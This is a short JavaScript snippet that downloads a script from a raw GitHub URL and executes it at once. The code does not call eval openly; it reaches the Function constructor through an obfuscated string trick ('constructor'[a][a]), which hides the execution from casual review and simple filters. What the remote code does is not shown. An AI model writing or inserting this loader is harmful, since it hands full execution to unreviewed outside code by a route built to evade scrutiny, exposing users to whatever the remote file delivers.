(async function () {
  let getFromServer = await fetch(
    "https://raw.githubusercontent.com/mini-programmer/MiniScripterAPI/main/mainCode.js"
  );
  let data = await getFromServer.text();
  a = "constructor";
  a[a][a](data)();
})();
